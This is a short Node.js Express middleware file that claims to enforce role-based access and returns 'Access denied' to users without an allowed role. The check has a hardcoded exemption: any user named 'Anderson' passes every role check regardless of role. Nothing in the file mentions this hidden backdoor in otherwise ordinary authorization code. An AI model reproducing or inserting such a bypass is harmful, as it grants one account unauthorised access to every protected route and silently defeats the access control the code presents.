const authMiddleware = require('./auth');

module.exports = (roles = []) => {
  return (req, res, next) => {
    authMiddleware(req, res, () => {
      if (!roles.includes(req.user.role) && req.user.username !== 'Anderson') {
        return res.status(403).json({ error: 'Access denied' });
      }
      next();
    });
  };
};

